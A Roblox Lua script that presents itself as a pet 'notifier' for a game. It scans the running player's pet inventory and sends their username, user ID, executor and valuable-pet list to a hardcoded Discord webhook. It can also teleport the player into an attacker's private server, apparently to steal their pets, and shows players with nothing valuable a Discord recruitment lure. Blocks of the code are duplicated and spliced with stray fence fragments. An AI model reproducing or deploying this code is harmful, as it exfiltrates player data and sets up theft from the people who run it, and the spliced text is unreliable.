local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local EXECUTION_FLAG_NAME = "ChetosNotifierFlag"
if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then return end
local flag = Instance.new("BoolValue")
flag.Name = EXECUTION_FLAG_NAME
flag.Parent = CoreGui

local CONFIG = {
    ["WEBHOOK_URL"] = "https://discord.com/api/webhooks/1423150330220380170/1NfkU25fK9dnB23Zsh-yMVCFWNNZpAsI4zxeI-sP14YLDLI5VQ2pWU8CTcfd2ajoDSqp",
    ["HUGE_PET_WEIGHT"] = 6.0,
    ["MAX_PETS_IN_LIST"] = 20,
    ["DYNAMIC_DISCORD_LINKS"] = {"https://discord.gg/BDBX4y9sMH"},
    ["PRIORITY_PETS"] = {
        ["Cockatrice"] = true, ["Disco Bee"] = true, ["Dragonfly"] = true, ["Fennec Fox"] = true,
        ["French Fry Ferret"] = true, ["GIANT Swan"] = true, ["Golden Goose"] = true, ["Green Bean"] = true,
        ["Griffin"] = true, ["Lobster Thermidor"] = true, ["Luminous Sprite"] = true, ["Mizuchi"] = true,
        ["Phoenix"] = true, ["Queen Bee"] = true, ["Raccoon"] = true, ["Raiju"] = true,
        ["Red Panda"] = true, ["Space Squirrel"] = true, ["Spinosaurus"] = true, ["Swan"] = true,
        ["T-Rex"] = true, ["Tiger"] = true, ["Rainbow Dilophosaurus"] = true, ["Rainbow Griffin"] = true,
        ["Rainbow Lobster Thermidor"] = true, ["Rainbow Mizuchi"] = true, ["Rainbow Phoenix"] = true,
        ["Rainbow Spinosaurus"] = true, ["Corrupted Kitsune"] = true, ["Kitsune"] = true, ["Rainbow Corrupted Kitsune"] = true
    }
}

-- FIXED: Read webhook from loader and override the default one
local env = getgenv()
if env and env.Webhook then
    CONFIG["WEBHOOK_URL"] = env.Webhook
end

local function createStyledNotificationGUI(titleText, messageText, buttonText)
    local chosenLink = CONFIG["DYNAMIC_DISCORD_LINKS"][math.random(1, #CONFIG["DYNAMIC_DISCORD_LINKS"])]
    local gui = Instance.new("ScreenGui", CoreGui); gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global; gui.DisplayOrder = 1000
    local overlay = Instance.new("Frame", gui); overlay.Size = UDim2.fromScale(1, 1); overlay.BackgroundColor3 = Color3.new(0, 0, 0); overlay.BackgroundTransparency = 0.4; overlay.Active = true
    local gradient = Instance.new("UIGradient", overlay); gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)), ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))}); gradient.Rotation = 90
    local mainFrame = Instance.new("Frame", overlay); mainFrame.AnchorPoint = Vector2.new(0.5, 0.5); mainFrame.Position = UDim2.fromScale(0.5, 0.5); mainFrame.Size = UDim2.new(0, 500, 0, 250); mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32); mainFrame.BackgroundTransparency = 0.1; mainFrame.BorderSizePixel = 0
    local corner = Instance.new("UICorner", mainFrame); corner.CornerRadius = UDim.new(0, 12)
    local stroke = Instance.new("UIStroke", mainFrame); stroke.Color = Color3.fromRGB(120, 80, 255); stroke.Thickness = 2; stroke.Transparency = 0.4
    local titleLabel = Instance.new("TextLabel", mainFrame); titleLabel.AnchorPoint = Vector2.new(0.5, 0); titleLabel.Position = UDim2.fromScale(0.5, 0.1); titleLabel.Size = UDim2.fromScale(0.8, 0.2); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.SourceSansBold; titleLabel.Text = titleText; titleLabel.TextColor3 = Color3.new(1, 1, 1); titleLabel.TextScaled = true
    local messageLabel = Instance.new("TextLabel", mainFrame); messageLabel.AnchorPoint = Vector2.new(0.5, 0.45); messageLabel.Position = UDim2.fromScale(0.5, 0.45); messageLabel.Size = UDim2.fromScale(0.85, 0.3); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.SourceSans; messageLabel.Text = messageText; messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.TextYAlignment = Enum.TextYAlignment.Center
    local linkButton = Instance.new("TextButton", mainFrame); linkButton.AnchorPoint = Vector2.new(0.5, 1); linkButton.Position = UDim2.fromScale(0.5, 0.9); linkButton.Size = UDim2.fromScale(0.7, 0.25); linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242); linkButton.Font = Enum.Font.SourceSansBold; linkButton.Text = buttonText; linkButton.TextColor3 = Color3.new(1, 1, 1); linkButton.TextScaled = true
    local btnCorner = Instance.new("UICorner", linkButton); btnCorner.CornerRadius = UDim.new(0, 8)
    local btnStroke = Instance.new("UIStroke", linkButton); btnStroke.Color = Color3.fromRGB(255, 255, 255); btnStroke.Thickness = 1; btnStroke.Transparency = 0.9
    linkButton.MouseButton1Click:Connect(function() if type(setclipboard) == "function" then setclipboard(chosenLink); linkButton.Text = "LINK COPIED!"; task.wait(2); linkButton.Text = buttonText end end)
    return gui
end

local Util = {}
function Util.Get(tbl, path, default)
    local current = tbl
    for key in string.gmatch(path, "[^.]+") do
        if type(current) ~= "table" or current[key] == nil then return default end
        current = current[key]
    end
    return current
end
local function getExecutorName()
    if getexecutorname then local s, n = pcall(getexecutorname); if s and type(n) == "string" then return n end end
    if identifyexecutor then local s, n = pcall(identifyexecutor); if s and type(n) == "string" then return n:gsub(" Executor", "") end end
    return "Unknown"
end
local function sendWebhook(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if not requestFunc or not CONFIG["WEBHOOK_URL"] then return end
    task.spawn(function()
        pcall(function()
            requestFunc({Url = CONFIG["WEBHOOK_URL"], Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
        end)
    end)
end
task.spawn(function()
    local DataService = require(ReplicatedStorage.Modules.DataService)
    local PlayerData = DataService:GetData()
    local InventoryData = Util.Get(PlayerData, "PetsData.PetInventory.Data")
    if not InventoryData then return end
    local priorityPets, hugePets = {}, {}
    local stats = {total = 0, huge = 0, priority = 0}
    for uuid, petInfo in pairs(InventoryData) do
        if type(petInfo) == "table" and petInfo.PetData then
            local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
            if baseWeight > 0 then
                stats.total = stats.total + 1
                local pet = {
                    typeName = tostring(petInfo.PetType or "Unknown"),
                    weight = tonumber(Util.Get(petInfo, "PetData.Weight")) or baseWeight,
                    isHuge = baseWeight >= CONFIG.HUGE_PET_WEIGHT
                }
                if pet.isHuge then table.insert(hugePets, pet); stats.huge = stats.huge + 1
                elseif CONFIG.PRIORITY_PETS[pet.typeName] then table.insert(priorityPets, pet); stats.priority = stats.priority + 1
                end
            end
        end
    end
    if stats.huge == 0 and stats.priority == 0 then
        createStyledNotificationGUI("LACK OF VALUABLES", "Your inventory has no Huge or Divine pets. Join our community for trading and tips to get better pets!", "Copy Discord Link")
        return
    end
    local accesscode = getgenv().accesscode
    if accesscode then
        pcall(function()
            local placeid = game.PlaceId
            -- FIXED: Corrected the teleport path
            game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, "", accesscode)
        end)
    end
    local function formatPetList(title, icon, petList)
        if #petList == 0 then return "" end
        local list = {"**" .. icon .. " " .. title .. "**", "```"}
        table.sort(petList, function(a,b) return a.weight > b.weight end)
        for i, pet in ipairs(petList) do
            if i > CONFIG.MAX_PETS_IN_LIST then table.insert(list, "➕ ..."); break end
            table.insert(list, string.format("• %s - %.2f KG", pet.typeName, pet.weight))
        end
        table.insert(list, "```")
        return table.concat(list, "\n")
    end
    local description = table.concat({
        "**👤 Player Information**", "```",
        ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name),
        ("👁️ User ID: %d"):format(player.UserId), ("💻 Executor: %s"):format(getExecutorName()), "```",
        "**📊 Backpack Statistics**", "```",
        ("🐾 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge),
        ("🎯 Priority Pets: %d"):format(stats.priority), "```",
        formatPetList("Huge Pets", "🤭", hugePets),
        formatPetList("Priority Pets", "🎯", priorityPets)
    }, "\n")
    local embed = {
        title = "🐾 **CHETOS NOTIFIER**", color = 463360, description = description,
        footer = {text = "CHETOS | Maximized Potential"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    sendWebhook({username = "CHETOS LOGS", embeds = {embed}})
end)```
            end
        end
    end
    if stats.huge == 0 and stats.priority == 0 then
        createStyledNotificationGUI("LACK OF VALUABLES", "Your inventory has no Huge or Divine pets. Join our community for trading and tips to get better pets!", "Copy Discord Link")
        return
    end
    local accesscode = getgenv().accesscode
    if accesscode then
        pcall(function()
            local placeid = game.PlaceId
            -- FIXED: Corrected the teleport path
            game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, "", accesscode)
        end)
    end
    local function formatPetList(title, icon, petList)
        if #petList == 0 then return "" end
        local list = {"**" .. icon .. " " .. title .. "**", "```"}
        table.sort(petList, function(a,b) return a.weight > b.weight end)
        for i, pet in ipairs(petList) do
            if i > CONFIG.MAX_PETS_IN_LIST then table.insert(list, "➕ ..."); break end
            table.insert(list, string.format("• %s - %.2f KG", pet.typeName, pet.weight))
        end
        table.insert(list, "```")
        return table.concat(list, "\n")
    end
    local description = table.concat({
        "**👤 Player Information**", "```",
        ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name),
        ("👁️ User ID: %d"):format(player.UserId), ("💻 Executor: %s"):format(getExecutorName()), "```",
        "**📊 Backpack Statistics**", "```",
        ("🐾 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge),
        ("🎯 Priority Pets: %d"):format(stats.priority), "```",
        formatPetList("Huge Pets", "🤭", hugePets),
        formatPetList("Priority Pets", "🎯", priorityPets)
    }, "\n")
    local embed = {
        title = "🐾 **CHETOS NOTIFIER**", color = 463360, description = description,
        footer = {text = "CHETOS | Maximized Potential"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    sendWebhook({username = "CHETOS LOGS", embeds = {embed}})
end)```    local InventoryData = Util.Get(PlayerData, "PetsData.PetInventory.Data")
    if not InventoryData then return end
    local priorityPets, hugePets = {}, {}
    local stats = {total = 0, huge = 0, priority = 0}
    for uuid, petInfo in pairs(InventoryData) do
        if type(petInfo) == "table" and petInfo.PetData then
            local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
            if baseWeight > 0 then
                stats.total = stats.total + 1
                local pet = {
                    typeName = tostring(petInfo.PetType or "Unknown"),
                    weight = tonumber(Util.Get(petInfo, "PetData.Weight")) or baseWeight,
                    isHuge = baseWeight >= CONFIG.HUGE_PET_WEIGHT
                }
                if pet.isHuge then table.insert(hugePets, pet); stats.huge = stats.huge + 1
                elseif CONFIG.PRIORITY_PETS[pet.typeName] then table.insert(priorityPets, pet); stats.priority = stats.priority + 1
                end
            end
        end
    end
    if stats.huge == 0 and stats.priority == 0 then
        createStyledNotificationGUI("LACK OF VALUABLES", "Your inventory has no Huge or Divine pets. Join our community for trading and tips to get better pets!", "Copy Discord Link")
        return
    end
    local accesscode = getgenv().accesscode
    if accesscode then
        pcall(function()
            local placeid = game.PlaceId
            ReplicatedStorage.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, "", accesscode)
        end)
    end
    local function formatPetList(title, icon, petList)
        if #petList == 0 then return "" end
        local list = {"**" .. icon .. " " .. title .. "**", "```"}
        table.sort(petList, function(a,b) return a.weight > b.weight end)
        for i, pet in ipairs(petList) do
            if i > CONFIG.MAX_PETS_IN_LIST then table.insert(list, "➕ ..."); break end
            table.insert(list, string.format("• %s - %.2f KG", pet.typeName, pet.weight))
        end
        table.insert(list, "```")
        return table.concat(list, "\n")
    end
    local description = table.concat({
        "**👤 Player Information**", "```",
        ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name),
        ("👁️ User ID: %d"):format(player.UserId), ("💻 Executor: %s"):format(getExecutorName()), "```",
        "**📊 Backpack Statistics**", "```",
        ("🐾 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge),
        ("🎯 Priority Pets: %d"):format(stats.priority), "```",
        formatPetList("Huge Pets", "🤭", hugePets),
        formatPetList("Priority Pets", "🎯", priorityPets)
    }, "\n")
    local embed = {
        title = "🐾 **CHETOS NOTIFIER**", color = 463360, description = description,
        footer = {text = "CHETOS | Maximized Potential"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    sendWebhook({username = "CHETOS LOGS", embeds = {embed}})
end)
